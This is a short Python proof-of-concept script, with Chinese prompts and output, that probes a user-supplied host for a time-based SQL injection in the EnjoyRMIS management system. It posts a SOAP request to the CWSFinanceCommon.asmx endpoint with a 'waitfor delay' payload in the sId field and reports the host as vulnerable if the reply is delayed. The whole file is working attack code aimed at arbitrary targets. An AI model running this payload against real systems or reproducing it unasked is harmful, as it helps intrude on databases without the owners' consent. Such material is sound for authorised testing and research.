```python
import time 
import requests

def verify(ip):
    url = f'{ip}EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
    'Connection': 'close',
    'Content-Length': '369',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'Content-Type': 'text/xml; charset=utf-8',
    'Accept-Encoding': 'gzip',
    }
    payload = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
    <GetOSpById xmlns="http://tempuri.org/">
    <sId>1';waitfor delay '0:0:5'--+</sId>
    </GetOSpById>
    </soap:Body>
    </soap:Envelope>'''
    try:
        start_time = time.time()
        response = requests.post(url, headers=headers, data=payload,verify=False)
        end_time = time.time()
        res_time = end_time - start_time
        # 验证成功输出相关信息
        if response.status_code == 200 and res_time > 5 and res_time < 8:
        	print(f"{ip}存在捷诚管理信息系统SQL注入漏洞！！！")

    except Exception as e:
    	pass

if __name__ == '__main__':
    self = input('请输入目标主机IP地址：')
    verify(self)
```

